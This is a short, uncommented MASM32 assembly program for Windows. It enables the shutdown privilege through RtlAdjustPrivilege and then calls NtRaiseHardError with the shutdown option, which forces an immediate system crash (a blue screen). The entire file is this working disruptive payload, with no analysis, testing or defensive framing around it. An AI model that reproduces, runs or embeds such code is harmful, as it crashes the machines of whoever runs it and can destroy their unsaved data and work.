.386
.model flat, stdcall
option casemap :none


include \masm32\include\masm32.inc
include \masm32\include\ntdll.inc
include \masm32\include\user32.inc

includelib \masm32\lib\masm32.lib
includelib \masm32\lib\ntdll.lib
includelib \masm32\lib\user32.lib

.data
    tmp DWORD ?

.code
main:
    lea eax, tmp
    push eax
    push 0
    push 1
    push 19
    call RtlAdjustPrivilege
    
    invoke NtRaiseHardError, 3221226504, 0, 0, 0, 6, addr tmp

end main
